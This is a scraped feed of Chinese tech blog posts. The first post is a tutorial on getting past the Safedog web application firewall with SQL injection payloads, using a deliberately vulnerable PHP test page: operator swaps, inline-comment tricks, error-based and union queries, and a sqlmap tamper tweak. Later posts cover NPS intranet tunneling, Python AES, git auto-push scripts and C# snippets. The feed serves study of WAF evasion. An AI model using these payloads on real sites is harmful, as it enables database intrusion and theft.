本地测试代码(PHP):\n$id = $_GET[\u0026#39;id\u0026#39;]; $con = mysql_connect(\u0026#34;localhost\u0026#34;,\u0026#34;root\u0026#34;,\u0026#34;root\u0026#34;); if (!$con){die(\u0026#39;Could not connect: \u0026#39; . mysql_error());} mysql_select_db(\u0026#34;dvwa\u0026#34;, $con); $query = \u0026#34;SELECT first_name,last_name FROM users WHERE user_id = \u0026#39;$id\u0026#39;; \u0026#34;; $result = mysql_query($query)or die(\u0026#39;\u0026lt;pre\u0026gt;\u0026#39;.mysql_error().\u0026#39;\u0026lt;/pre\u0026gt;\u0026#39;); while($row = mysql_fetch_array($result)) { echo $row[\u0026#39;0\u0026#39;] . \u0026#34;\u0026amp;nbsp\u0026#34; . $row[\u0026#39;1\u0026#39;]; echo \u0026#34;\u0026lt;br /\u0026gt;\u0026#34;;}echo \u0026#34;\u0026lt;br/\u0026gt;\u0026#34;;echo $query; mysql_close($con); 绕过拦截and 1=1 首先先稍微测试一番,发现存在安全狗\nhttp://127.0.0.1/test.php?id=1 and 1=1%23 and 1\t拦截 and '1' 拦截 and a\t不拦截 and 'a' 拦截 and !\t不拦截 and 1+1 拦截 and 1+a 拦截 and hex(1) 不拦截 通过测试我们发现当 and 后面跟上 数字型和字符型时他会给我们拦截掉 ，其实我们在安全狗的规则里面可以看到他拦截 and 和 or 所以我们有2个思路\n 用其他字符替换 and 或者 or 带入的不是字符串和数字型，带入一个特殊符号   针对第一种我们可以去看看运算符号 随便找到几个| ^ xor \u0026amp; / * \u0026amp;\u0026amp; || 等等还有很多\n与运算 a \u0026amp; b , 或运算 a | b , 异或运算 a ^ b 那么可以试着将and替换成\u0026amp;\u0026amp;,URL编码得到%26%26,将1=1替换成true或者false,发现可以成功绕过\nhttp://127.0.0.1/test.php?id=1' %26%26 true%23 另外在分享一些可以绕过目前版本的安全狗测试payload (注:mysql支持\u0026amp;\u0026amp; || ,oracle不支持 \u0026amp;\u0026amp; ||）\nhttp://127.0.0.1/test.php?id=1' || true%23 //将and 1=1替换为|| true,也可以绕过安全狗 http://127.0.0.1/test.php?id=1' ||(1) %23 //使用括号代替空格绕过 //异或逻辑运算符xor，运算法则是：两个条件相同（同真或同假）即为假（0），两个条件不同即为真（1） http://127.0.0.1/test.php?id=1' xor 1%23\thttp://127.0.0.1/test.php?id=1' xor true%23 绕过order by查询 判断查询字段,使用mysql的/*!*/内敛注释去绕过防护,而其中的代码是可以正常执行的\nhttp://127.0.0.1/test.php?id=1' /*!order*//*!by*/2%23 绕过union select查询 使用union xxx页面正常 但是用union和select放在在一起就被发现啦 在网上找了好一阵子,发现有大佬提供的payload使用正则表达式去绕过\nhttp://127.0.0.1/test.php?id=1'=/*!user () regexp 0x5e72*/--+  对于数字型注入,可以将其转换成浮点型 联合查询绕waf,%0a为换行符经过URL编码得到的,可以通过换行符进行绕过, 函数中可以插入任何混淆字符绕过waf 另外使用-1可以省去空格绕过waf  http://127.0.0.1/test.php?id=1.0 /*union/*!select-1*/,user--%0a()%23 基于报错信息的注入绕安全狗\nhttp://127.0.0.1/test.php?id=1' and /*!12345updatexml!*/(1,concat(0x7e,version()))%23 http://127.0.0.1/test.php?id=1' and /*!12345extractvalue!*/(1,concat(0x7e,version()))%23 绕过select from 使用大括号去绕过\nhttp://127.0.0.1/test.php?id=1.0 /*union/*!select-1*/,2,3,4From{information_schema.tables} 使用反引号去绕过\nhttp://127.0.0.1/test.php?id=1.0 /*union/*!select-1*/,2,3,4 From`information_schema.tables` 使用\\N去绕过\nhttp://127.0.0.1/test.php?id=1.0 /*union/*!select-1*/,2,3,\\Nfrom information_schema.tables 括号法去绕过\nhttp://127.0.0.1/test.php?id=1.0 /*union/*!select-1*/,2,3,From(((information_schema.tables))) 也可以组合起来\nhttp://127.0.0.1/test.php?id=1.0 /*union/*!select-1*/,2,3,4\\Nfrom{a`information_schema`.tables} 这些都是去掉空格的合法语句,当然如果不拦截/*/或/!*/的话,也可以尝试这两个\n 提示，安全狗默认不开启对information_schema的拦截，如果开启了，那么就得找支持post传递数据的注入点了，post下不拦截information_schema这个关键词。\n 补充点 php+mysql环境下支持的空格有：\n%0a,%0b,%0c,%0d,%20,%09,%a0,/**/ 其中使用的最多的就是%0a,%0b,%a0,/**/，这四个当作空格插入在语句中来扰乱waf检测。 干货分享：使用/^!$asd%2a–=/代替空格即可，找到sqlmap中tamper目录下的space2plus.py文件，将其中代替空格的/*/换成/^!$asd%2a–=*/即可使用sqlmap跑了。\n缓冲区溢出绕waf 另外也可以对安全狗实行缓冲区溢出绕waf 缓冲区溢出用于对WAF，有不少WAF是C写的，而C语言本身没有缓冲区保护机制，因此如果WAF在处理测试量时超出其缓冲区长度，就会引发bug从而实现绕过 要求是(针对于安全狗而已): GET类型请求转换成POST类型 Content-Length头长度大于4008 正常参数放置在脏数据后面\n","permalink":"https://examplesite.com/posts/20201201/","summary":"","title":"绕waf系列之绕安全狗"},{"content":"NPS内网穿透配置NPS github项目地址 https://github.com/cnlh/nps 原理 服务器端配置  准备工作  一台拥有公网IP的VPS 安装nps软件包    wget https://github.com/cnlh/nps/releases/download/v0.23.1/linux_amd64_server.tar.gz tar -zxvf linux_amd64_server.tar.gz cd nps/ ./nps start  配置server端 在安装完成，启动nps后，便可访问server_IP:8080来访问nps配置dashboard了 要求登陆，默认的用户名：admin，密码：123   网页dashboard的用户名和密码可在nps/conf/nps.conf配置文件中的web模块中修改 登陆进入dashboard后,看到界面，默认客户端为0（这里我已经创建了一个） 默认的客户端链接端口为8024（该端口为客户端用于链接服务器的端口，来保持链接，原理与反向代理相似）  新建客户端 这里我们创建一个新的客户端， 这里的客户端只是在server配置的客户端，之后使用客户端软件链接，所以要与客户端配置一致   创建好的客户端是这样的，status为offline，因为客户端还没链接 这里server会自动随机生成一个vkey=7oswclqe5knqu15x（之后配置客户端会使用）  客户端配置 Windows\n 下载客户端 https://github.com/cnlh/nps/releases/download/v0.23.1/win_amd64_client.tar.gz 这里使用windows作为客户端 下载解压后配置vps.conf， 将其他配置删除，只保留如图所示的配置 修改 server_addr为VPS的公网ip和dashboard的默认客户端链接端口 vkey为server网页上新建的客户端生成的vkey  server_addr=server_IP:8024 conn_type=tcp vkey=7oswclqe5knqu15x auto_reconnection=true max_conn=1000 flow_limit=1000 rate_limit=1000 basic_username=11 basic_password=3 web_username=user web_password=123 crypt=true compress=true 修改完配置文件后运行nsp.exe，显示成功链接 CentOS wget https://github.com/cnlh/nps/releases/download/v0.23.1/linux_amd64_client.tar.gz tar -zxvf linux_amd64_client.tar.gz cd npc/ ./npc -server=66.42.81.9:8024 -vkey=7oswclqe5knqu15x -type=tcp 链接成功 两者链接成功后server端中客户端status转为online 使用测试 创建tcp tunnel 这里使用内网router配置网页做测试 点击tunnel创建tcp隧道 点击新增 这里我的router内网ip为192.168.1.1 创建完成 访问测试 访问server_ip:10001 成功访问到内网router配置网页  中文文档： https://github.com/ehang-io/nps/blob/master/README_zh.md\n","permalink":"https://examplesite.com/posts/20201101/","summary":"","title":"NPS内网穿透配置"},{"content":" 在线抠图：https://www.remove.bg\n  png转ico：https://www.easyicon.net/covert\n 准备  准备个压缩软件，例如好压，WinRAR等等，根据文字举一反三即可 这是将要打包的主目录文件  exe在哪里就复制哪里的相对路径，以主文件目录为准，一定要相对路径，否则移动到别的地方会无法使用\n\\Program\\Thunder.exe 打包exe  选择-压缩文件格式 勾选-创建自解压格式 点击-自解压选项  选项卡选择-解压 解压后运行-输入相对路径  \\Program\\Thunder.exe  强调下，一定要相对路径否则移动到别处会无法使用\n  选项卡选择-模式\n  勾选-解包到临时文件夹\n  选择-全部隐藏   选项卡选择-更新\n  解压并替换文件\n  覆盖所有文件   选项卡选择-图标\n  浏览选择绝对路径的ico图标文件   完成 打包好后删除了主文件只保留exe文件后移动到别处也可以使用 ","permalink":"https://examplesite.com/posts/20201001/","summary":"","title":"使用好压打包成单个exe文件"},{"content":"国际版  国际版就是微软官网那些都是国际版的，速度比世纪互联版差，有些地方需要梯子，敏感东西不会被和谐。\n Microsoft OneDrive Microsoft Azure 世纪互联版  世纪互联版，只能企业注册，无法个人注册，速度很快，都不需要梯子，有些敏感东西会被和谐。\n Microsoft OneDrive Microsoft Azure  获取ID和Key ","permalink":"https://examplesite.com/posts/20200901/","summary":"","title":"搭建OneDrive云盘"},{"content":" 转载自：https://blog.csdn.net/chouzhou9701/article/details/89339625\n 前言 这几天研究了一下 python 实现 AES 加密，有很多坑\nAES 加密的参数及其条件 这个 AES 加密的主要坑就在于这些条件， 首先 aes 加密有一下几个参数\n  秘钥：加密的时候用秘钥，解密的时候需要同样的秘钥才能解出来\n  明文：需要加密的参数\n  模式：aes 加密常用的有 ECB 和 CBC 模式（我只用了这两个模式，还有其他模式）\n  iv 偏移量：这个参数在 ECB 模式下不需要，在 CBC 模式下需要\n  需要输入这些参数才能返回一个密文 下面是重点 下面说一下这几个参数的条件：\n  秘钥：必须是16位字节或者24位字节或者32位字节（因为python3的字符串是unicode编码，需要 encode才可以转换成字节型数据）\n  明文：字节长度需要是16位的倍数\n  下面我用python3简单的方法实现:\n简单方法 from Crypto.Cipher import AES import base64 password = \u0026#39;1234567890123456\u0026#39; #秘钥 text = \u0026#39;1234567890123456\u0026#39; #需要加密的内容 model = AES.MODE_ECB #定义模式 aes = AES.new(password,model) #创建一个aes对象 en_text = aes.encrypt(text) #加密明文 print(en_text) en_text = base64.encodebytes(en_text) #将返回的字节型数据转进行base64编码 print(en_text) en_text = en_text.decode(\u0026#39;utf8\u0026#39;) #将字节型数据转换成python中的字符串类型 print(en_text.strip()) 输出 b\u0026#39;u|\\xcd\\x0c\\xdc\\\\\\x90\\xea\\xdb\\xee\\xec\\xf68\\xdd\\x00\\x00\u0026#39; b\u0026#39;dXzNDNxckOrb7uz2ON0AAA==\\n\u0026#39; dXzNDNxckOrb7uz2ON0AAA== 这里有个问题就是密钥和加密的文本内容都必须是固定的16位（根据我前面说的参数要求）\n所以下面优化的代码（将秘钥和需要加密的文本补成对应的位数）\n优化的代码 from Crypto.Cipher import AES import base64 def add_to_16(par): par = par.encode() #先将字符串类型数据转换成字节型数据 while len(par) % 16 != 0: #对字节型数据进行长度判断 par += b\u0026#39;\\x00\u0026#39; #如果字节型数据长度不是16倍整数就进行 补充 return par password = \u0026#39;123456\u0026#39; #秘钥 text = \u0026#39;1\u0026#39; #需要加密的内容 model = AES.MODE_ECB #定义模式 aes = AES.new(add_to_16(password),model) #创建一个aes对象 en_text = aes.encrypt(add_to_16(text)) #加密明文 print(en_text) en_text = base64.encodebytes(en_text) #将返回的字节型数据转进行base64编码 print(en_text) en_text = en_text.decode(\u0026#39;utf8\u0026#39;) #将字节型数据转换成python中的字符串类型 print(en_text.strip()) 这里简单的说一下几个存在的问题\n  其实上述代码我简单省略的进行补全到16位，而秘钥24位也是可以的，你可以自己写一个函数来进行秘钥的补全\n  为什么进行补全之前先进行 .encode() ? 首先 encode() 不加参数默认是以 utf8 编码的，另外先进行 encode 的原因是因为怕加密的文本中存在汉字，而汉字的 utf8 编码的字节长度是3（gbk对汉字的编码字节长度是2），所以为了防止补全的位数不正确，这里必须先进行转换（我看到很多别的文章先补全后进行转换的，而且还是拿空格补全的。。。）\n  不知道有没有发现，aes.encrypt() 在第一个程序中我传递的是字符串类型，第二个程序传递的是字节型数据，这个函数其实是既可以传递字符串数据类型也可以传递字节型数据的\n  上面的程序没有解密函数，所以我对整个加密解密进行了一个类的最终封装\n最终封装 from Crypto.Cipher import AES import base64 class aescrypt(): def __init__(self,key,model,iv,encode_): self.encode_ = encode_ self.model = {\u0026#39;ECB\u0026#39;:AES.MODE_ECB,\u0026#39;CBC\u0026#39;:AES.MODE_CBC}[model] self.key = self.add_16(key) if model == \u0026#39;ECB\u0026#39;: self.aes = AES.new(self.key,self.model) #创建一个aes对象 elif model == \u0026#39;CBC\u0026#39;: self.aes = AES.new(self.key,self.model,iv) #创建一个aes对象 #这里的密钥长度必须是16、24或32，目前16位的就够用了 def add_16(self,par): par = par.encode(self.encode_) while len(par) % 16 != 0: par += b\u0026#39;\\x00\u0026#39; return par def aesencrypt(self,text): text = self.add_16(text) self.encrypt_text = self.aes.encrypt(text) return base64.encodebytes(self.encrypt_text).decode().strip() def aesdecrypt(self,text): text = base64.decodebytes(text.encode(self.encode_)) self.decrypt_text = self.aes.decrypt(text) return self.decrypt_text.decode(self.encode_).strip(\u0026#39;\\0\u0026#39;) if __name__ == \u0026#39;__main__\u0026#39;: pr = aescrypt(\u0026#39;12345\u0026#39;,\u0026#39;ECB\u0026#39;,\u0026#39;\u0026#39;,\u0026#39;gbk\u0026#39;) en_text = pr.aesencrypt(\u0026#39;好好学习\u0026#39;) print(\u0026#39;密文:\u0026#39;,en_text) print(\u0026#39;明文:\u0026#39;,pr.aesdecrypt(en_text)) 时隔多天, 我终于用上了以上的代码然后我发现我的代码是错误的,评论区也有指出\n所以我又重新测试发现在ECB模式是没有问题的, 在使用CBC 模式的条件下, 不可以在类的构造函数里面构建 aes对象, 也就是说在CBC模式下 每一次加密和解密 都需要重新构建aes对象 self.aes = AES.new(self.key,self.model,iv), 否则加密和解密的结果就会不一致或者报错\n另外就是关于 padding模式方面的问题\n ZeroPadding PKCS7Padding PKCS5Padding  这几种模式的区别, 我也不从算法方面探讨了, 因为我发现当你用什么补全的时候, 解密回来的字符串里是包含补全使用的字符串的所以代码中用'\\x00' 补全是没有问题的, 你用什么补全都可以(这里我用的是python,至于别的语言是不是这样我就不知道了)\n最后一个点就是 关于base64编码的问题了,我也不知道这个是不是由于padding 模式区别导致的, 因为有的密文采用的是base64编码, 有点密文采用的是 hexstr编码, 反正无论采用什么编码,在真正加密和解密的时候是绝对会转换成 bytes类型的\n所以我最终只做一个只是针对 bytes 的AES加密解密类\n加密解密类 from Crypto.Cipher import AES import base64 class Aescrypt(): def __init__(self,key,model,iv): self.key = self.add_16(key) self.model = model self.iv = iv def add_16(self,par): if type(par) == str: par = par.encode() while len(par) % 16 != 0: par += b\u0026#39;\\x00\u0026#39; return par def aesencrypt(self,text): text = self.add_16(text) if self.model == AES.MODE_CBC: self.aes = AES.new(self.key,self.model,self.iv) elif self.model == AES.MODE_ECB: self.aes = AES.new(self.key,self.model) self.encrypt_text = self.aes.encrypt(text) return self.encrypt_text def aesdecrypt(self,text): if self.model == AES.MODE_CBC: self.aes = AES.new(self.key,self.model,self.iv) elif self.model == AES.MODE_ECB: self.aes = AES.new(self.key,self.model) self.decrypt_text = self.aes.decrypt(text) self.decrypt_text = self.decrypt_text.strip(b\u0026#34;\\x00\u0026#34;) return self.decrypt_text if __name__ == \u0026#39;__main__\u0026#39;: passwd = \u0026#34;123456781234567\u0026#34; iv = \u0026#39;1234567812345678\u0026#39; aescryptor = Aescrypt(passwd,AES.MODE_CBC,iv) # CBC模式 # aescryptor = Aescrypt(passwd,AES.MODE_ECB,\u0026#34;\u0026#34;) # ECB模式 text = \u0026#34;好好学习\u0026#34; en_text = aescryptor.aesencrypt(text) print(\u0026#34;密文:\u0026#34;,en_text) text = aescryptor.aesdecrypt(en_text) print(\u0026#34;明文:\u0026#34;,text) 上面这段代码 你输入的 所有参数都应该是字符串或者 字节型数据, 并且输出的都是 字节型数据\n如果进行一些编码转换可以在类的外部进行完成, 这里我就不写了, 到这里我才真正的明白为什么 python自己不封装一下这个算法, 确实可能的情况太多了, 这样还是比较灵活的。(其实进一步封装也是可以的, 就是判断输入的是base64字符串,还是hexstr,或者bytes, 然后在自定义一下输出,不过我是懒得弄了)\n另外附上 base64 编码解码 和 hexstr 编码解码\n编码解码 import base64 import binascii data = \u0026#34;hello\u0026#34;.encode() data = base64.b64encode(data) print(\u0026#34;base64编码:\u0026#34;,data) data = base64.b64decode(data) print(\u0026#34;base64解码:\u0026#34;,data) data = binascii.b2a_hex(data) print(\u0026#34;hexstr编码:\u0026#34;,data) data = binascii.a2b_hex(data) print(\u0026#34;hexstr解码:\u0026#34;,data) 如果你真的认真的读了我的这篇文章, 我相信你肯定解决了你的问题, 如果不是这样可以评论区提出\n","permalink":"https://examplesite.com/posts/20170701/","summary":"","title":"python3实现AES加密"},{"content":"# -*- coding: utf-8 -*- import os import chardet import subprocess def convert(filename, out_enc): try: with open(filename, \u0026#39;rb\u0026#39;) as f: content_bytes = f.read() source_encoding = chardet.detect(content_bytes).get(\u0026#39;encoding\u0026#39;) print(chardet.detect(content_bytes)) with open(filename, \u0026#39;r\u0026#39;, encoding=source_encoding) as f: content_str = f.read() with open(filename, \u0026#39;w\u0026#39;, encoding=out_enc) as f: f.write(content_str) with open(filename, \u0026#39;rb\u0026#39;) as f: content_bb = f.read() except IOError as err: print(\u0026#34;I/O error:{0}\u0026#34;.format(err)) def explore(dir, suffix, out_enc): for root, dirs, files in os.walk(dir): for file in files: if os.path.splitext(file)[1] == suffix: print(file) path = os.path.join(root, file) convert(path, out_enc) def exe(): subprocess.check_output(\u0026#34;hugo\u0026#34;, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE) subprocess.run(\u0026#34;git add .\u0026#34;, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE) subprocess.run(\u0026#34;git commit -m \\\u0026#34;main\\\u0026#34;\u0026#34;, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE) subprocess.run(\u0026#34;git push\u0026#34;, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE) explore(\u0026#34;public\u0026#34;, \u0026#34;.md\u0026#34;, \u0026#34;utf-8-sig\u0026#34;) os.chdir(\u0026#39;public\u0026#39;) subprocess.run(\u0026#34;git add .\u0026#34;, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE) subprocess.run(\u0026#34;git commit -m \\\u0026#34;main\\\u0026#34;\u0026#34;, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE) subprocess.run(\u0026#34;git push\u0026#34;, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE) def py(): # 推送到 Hugo 仓库 print(\u0026#39;-\u0026#39;*80) os.system(\u0026#39;hugo\u0026#39;) os.system(\u0026#39;git add .\u0026#39;) os.system(\u0026#39;git commit -m \\\u0026#34;main\\\u0026#34;\u0026#39;) os.system(\u0026#39;git push\u0026#39;) print(\u0026#39;-\u0026#39;*80) # 批量修改文档编码 explore(\u0026#34;public\u0026#34;, \u0026#34;.md\u0026#34;, \u0026#34;utf-8-sig\u0026#34;) # 推送到 CNbysec.github.io 仓库 print(\u0026#39;-\u0026#39;*80) os.chdir(\u0026#39;public\u0026#39;) os.system(\u0026#39;git add .\u0026#39;) os.system(\u0026#39;git commit -m \\\u0026#34;main\\\u0026#34;\u0026#39;) os.system(\u0026#39;git push\u0026#39;) print(\u0026#39;-\u0026#39;*80) # 本地部署 os.chdir(\u0026#39;../\u0026#39;) os.system(\u0026#39;hugo server\u0026#39;) if __name__ == \u0026#34;__main__\u0026#34;: # exe() py() ","permalink":"https://examplesite.com/posts/20170601/","summary":"","title":"Python部署推送"},{"content":"实现自动推送到仓库 # -*- coding:utf-8 -*- from watchdog.observers import Observer from watchdog.events import * import time import os def push(change): print(\u0026#39;-\u0026#39;*76) os.system(\u0026#39;git add .\u0026#39;) os.system(\u0026#39;git commit -m\\\u0026#34;auto\u0026#39;+change+\u0026#39;\\\u0026#34;\u0026#39;) os.system(\u0026#39;git push -u origin master\u0026#39;) print(\u0026#39;-\u0026#39;*76) class FileEventHandler(FileSystemEventHandler): # 初始化魔术方法 def __init__(self): FileSystemEventHandler.__init__(self) # 文件或文件夹移动 def on_moved(self, event): if event.is_directory: print(\u0026#34;directory moved from {0} to {1}\u0026#34;.format(event.src_path, event.dest_path)) else: print(\u0026#34;file moved from {0} to {1}\u0026#34;.format(event.src_path, event.dest_path)) # 这里我们只判断文件修改,如需加入文件夹修改,只需在上面的if条件中调用push函数即可 push(\u0026#34;文件移动: {0} to {1}\u0026#34;.format(event.src_path, event.dest_path)) # 创建文件或文件夹 def on_created(self, event): if event.is_directory: print(\u0026#34;directory created:{0}\u0026#34;.format(event.src_path)) else: print(\u0026#34;file created:{0}\u0026#34;.format(event.src_path)) push(\u0026#34;创建文件:{0}\u0026#34;.format(event.src_path)) # 删除文件或文件夹 def on_deleted(self, event): if event.is_directory: print(\u0026#34;directory deleted:{0}\u0026#34;.format(event.src_path)) else: print(\u0026#34;file deleted:{0}\u0026#34;.format(event.src_path)) push(\u0026#34;删除文件:{0}\u0026#34;.format(event.src_path)) # 移动文件或文件夹 def on_modified(self, event): if event.is_directory: print(\u0026#34;directory modified:{0}\u0026#34;.format(event.src_path)) else: print(\u0026#34;file modified:{0}\u0026#34;.format(event.src_path)) push(\u0026#34;文件修改:{0}\u0026#34;.format(event.src_path)) if __name__ == \u0026#34;__main__\u0026#34;: # 实例化Observer对象 observer = Observer() event_handler = FileEventHandler() # 设置监听目录 dis_dir = \u0026#34;./_posts/\u0026#34; observer.schedule(event_handler, dis_dir, True) observer.start() try: while True: # 设置监听频率(间隔周期时间) time.sleep(1) except KeyboardInterrupt: observer.stop() observer.join() ","permalink":"https://examplesite.com/posts/20170501/","summary":"","title":"Python实现自动推送到仓库"},{"content":"批量修改文档编码 # -*- coding: utf-8 -*- import os import chardet def convert(filename, out_enc): try: with open(filename, \u0026#39;rb\u0026#39;) as f: content_bytes = f.read() source_encoding = chardet.detect(content_bytes).get(\u0026#39;encoding\u0026#39;) print(chardet.detect(content_bytes)) with open(filename, \u0026#39;r\u0026#39;, encoding=source_encoding) as f: content_str = f.read() with open(filename, \u0026#39;w\u0026#39;, encoding=out_enc) as f: f.write(content_str) with open(filename, \u0026#39;rb\u0026#39;) as f: content_bb = f.read() except IOError as err: print(\u0026#34;I/O error:{0}\u0026#34;.format(err)) def explore(dir, suffix, out_enc): for root, dirs, files in os.walk(dir): for file in files: if os.path.splitext(file)[1] == suffix: print(file) path = os.path.join(root, file) convert(path, out_enc) def main(): explore(\u0026#34;./public\u0026#34;, \u0026#34;.md\u0026#34;, \u0026#34;utf-8-sig\u0026#34;) if __name__ == \u0026#34;__main__\u0026#34;: main() ","permalink":"https://examplesite.com/posts/20170401/","summary":"","title":"Python批量修改文档编码"},{"content":"tkinter多线程 # -*-coding:utf-8-*- import threading import tkinter import tkinter.messagebox def message(): tkinter.messagebox.showinfo(message=\u0026#34;弹出消息\u0026#34;) def sta(): th = threading.Thread(target=main) th.setDaemon(True) th.start() if __name__ == \u0026#39;__main__\u0026#39;: root = tkinter.Tk() root.title(\u0026#34;title\u0026#34;) root.iconbitmap(\u0026#34;favicon.ico\u0026#34;) root.resizable(width=False, height=False) sw = root.winfo_screenwidth() sh = root.winfo_screenheight() x = (sw - 300) / 2 y = (sh - 300) / 5 root.geometry(\u0026#34;%dx%d+%d+%d\u0026#34; % (200, 200, x, y)) message = tkinter.Button(root, text=\u0026#34;弹框消息\u0026#34;, bg=\u0026#39;white\u0026#39;, fg=\u0026#39;green\u0026#39;, command=message) message.pack() message = message.place(x=65, y=150, width=60, height=40) sta = tkinter.Button(root, text=\u0026#34;开 始\u0026#34;, bg=\u0026#39;white\u0026#39;, fg=\u0026#39;red\u0026#39;, command=sta) sta.pack() sta = sta.place(x=120, y=100, width=60, height=40) root.mainloop() ","permalink":"https://examplesite.com/posts/20170301/","summary":"","title":"Tkinter多线程"},{"content":"读取yaml文件 import yaml def getYaml(path): proPath = os.path.dirname(os.path.realpath(__file__)) yamlPath = os.path.join(proPath, path) f = open(yamlPath, \u0026#34;r\u0026#34;, encoding=\u0026#34;utf-8\u0026#34;) data = yaml.full_load(f) f.close() return data ","permalink":"https://examplesite.com/posts/20170201/","summary":"","title":"python读取yaml文件"},{"content":"图片切片 from PIL import Image def cutImg(path, x, y, w, h): im = Image.open(path) img_size = im.size region = im.crop((x, y, x + w, y + h)) region.save(\u0026#39;cutImg.png\u0026#39;) return format(img_size) 获取图片位置上的rgb颜色 from PIL import Image def getPix(Path, pixelX, pixelY): img_src = Image.open(Path) img_src = img_src.convert(\u0026#39;RGB\u0026#39;) str_strlist = img_src.load() data = str_strlist[int(pixelX), int(pixelY)] img_src.close() print(data) return data ","permalink":"https://examplesite.com/posts/20170101/","summary":"","title":"python图片切片"},{"content":"主线程 using System; using System.Threading; namespace MultithreadingApplication { class MainThreadProgram { static void Main(string[] args) { Thread th = Thread.CurrentThread; th.Name = \u0026#34;MainThread\u0026#34;; Console.WriteLine(\u0026#34;This is {0}\u0026#34;, th.Name); Console.ReadKey(); } } } 创建线程 using System; using System.Threading; namespace MultithreadingApplication { class ThreadCreationProgram { public static void CallToChildThread() { Console.WriteLine(\u0026#34;Child thread starts\u0026#34;); } static void Main(string[] args) { ThreadStart childref = new ThreadStart(CallToChildThread); Console.WriteLine(\u0026#34;In Main: Creating the Child thread\u0026#34;); Thread childThread = new Thread(childref); childThread.Start(); Console.ReadKey(); } } } 管理线程 using System; using System.Threading; namespace MultithreadingApplication { class ThreadCreationProgram { public static void CallToChildThread() { Console.WriteLine(\u0026#34;Child thread starts\u0026#34;); // 线程暂停 5000 毫秒  int sleepfor = 5000; Console.WriteLine(\u0026#34;Child Thread Paused for {0} seconds\u0026#34;, sleepfor / 1000); Thread.Sleep(sleepfor); Console.WriteLine(\u0026#34;Child thread resumes\u0026#34;); } static void Main(string[] args) { ThreadStart childref = new ThreadStart(CallToChildThread); Console.WriteLine(\u0026#34;In Main: Creating the Child thread\u0026#34;); Thread childThread = new Thread(childref); childThread.Start(); Console.ReadKey(); } } } 销毁线程 using System; using System.Threading; namespace MultithreadingApplication { class ThreadCreationProgram { public static void CallToChildThread() { try { Console.WriteLine(\u0026#34;Child thread starts\u0026#34;); // 计数到 10  for (int counter = 0; counter \u0026lt;= 10; counter++) { Thread.Sleep(500); Console.WriteLine(counter); } Console.WriteLine(\u0026#34;Child Thread Completed\u0026#34;); } catch (ThreadAbortException e) { Console.WriteLine(\u0026#34;Thread Abort Exception\u0026#34;); } finally { Console.WriteLine(\u0026#34;Couldn\u0026#39;t catch the Thread Exception\u0026#34;); } } static void Main(string[] args) { ThreadStart childref = new ThreadStart(CallToChildThread); Console.WriteLine(\u0026#34;In Main: Creating the Child thread\u0026#34;); Thread childThread = new Thread(childref); childThread.Start(); // 停止主线程一段时间  Thread.Sleep(2000); // 现在中止子线程  Console.WriteLine(\u0026#34;In Main: Aborting the Child thread\u0026#34;); childThread.Abort(); Console.ReadKey(); } } } ","permalink":"https://examplesite.com/posts/20161201/","summary":"","title":"C# 多线程"},{"content":"下载图片到本地 public void saveimage() { WebClient mywebclient = new WebClient(); string url = \u0026#34;http://images.google.cn/intl/zh-CN_ALL/images/images_hp.gif\u0026#34;; string newfilename = DateTime.Now.Year.ToString() + DateTime.Now.Month.ToString() + DateTime.Now.Day.ToString() + DateTime.Now.Hour.ToString() + DateTime.Now.Minute.ToString() + DateTime.Now.Second.ToString() + \u0026#34;.jpg\u0026#34;; string filepath = @\u0026#34;F:\\\u0026#34; + newfilename; try { mywebclient.DownloadFile(url, filepath); //filename = newfilename;  } catch (Exception ex) { MessageBox.Show(ex.ToString()); } } ","permalink":"https://examplesite.com/posts/20161101/","summary":"","title":"C# 下载图片到本地"},{"content":"使用Newtonsoft.Json解析json Visual Studio中搜索安装Newtonsoft.Json插件\n// 解析对象 string jsonText = \u0026#34;{\\\u0026#34;zone\\\u0026#34;:\\\u0026#34;海淀\\\u0026#34;,\\\u0026#34;zone_en\\\u0026#34;:\\\u0026#34;haidian\\\u0026#34;}\u0026#34;; JObject jo = (JObject)JsonConvert.DeserializeObject(jsonText); string zone = jo[\u0026#34;zone\u0026#34;].ToString(); string zone_en = jo[\u0026#34;zone_en\u0026#34;].ToString(); // 解析数组 string jsonText = \u0026#34;[\\\u0026#34;海淀\\\u0026#34;,\\\u0026#34;北京\\\u0026#34;,\\\u0026#34;上海\\\u0026#34;}\u0026#34;; JObject jo = (JObject)JsonConvert.DeserializeObject(jsonText); JArray rangQiuList = (JArray)jo; ","permalink":"https://examplesite.com/posts/20161001/","summary":"","title":"C# 使用Newtonsoft.Json解析json"},{"content":"复制、粘贴文本信息到剪贴板 // 复制： private void button1_Click(object sender, System.EventArgs e) { if(textBox1.SelectedText != ”\u0026#34;) 　Clipboard.SetDataObject(textBox1.SelectedText); } // 粘贴： private void button2_Click(object sender, System.EventArgs e) { IDataObject iData = Clipboard.GetDataObject(); if(iData.GetDataPresent(DataFormats.Text)) { textBox2.Text = (String)iData.GetData(DataFormats.Text); } } 主要通过调用Clipborad的API完成。 ","permalink":"https://examplesite.com/posts/20160901/","summary":"","title":"C# 复制、粘贴文本信息到剪贴板"},{"content":"通过URL获取图片并显示在PictureBox上的方法 string url = string.Format(@\u0026#34;http://webservice.36wu.com/DimensionalCodeService.asmx/GetCodeImgByString?size={0}\u0026amp;content={1}\u0026#34;, 5, 123456); System.Net.WebRequest webreq = System.Net.WebRequest.Create(url); System.Net.WebResponse webres = webreq.GetResponse(); using(System.IO.Stream stream = webres.GetResponseStream()) { pictureBox1.Image = Image.FromStream(stream); } ","permalink":"https://examplesite.com/posts/20160801/","summary":"","title":"C# 通过URL获取图片并显示在PictureBox上的方法"},{"content":"禁止Form窗口调整大小 禁止Form窗口调整大小方法：FormBorderStyle 设为 FixedSingle； 不能使用最大化窗口：MaximuzeBox 设为 False； 不能使用最小化窗口：MinimizeBox 设为 False； 禁止combobox输入方法：将DropDownStyle 设为 DropDownList ","permalink":"https://examplesite.com/posts/20160701/","summary":"","title":"C# 禁止Form窗口调整大小"},{"content":"新建 requirements.txt beautifulsoup4==4.8.2 certifi==2019.11.28 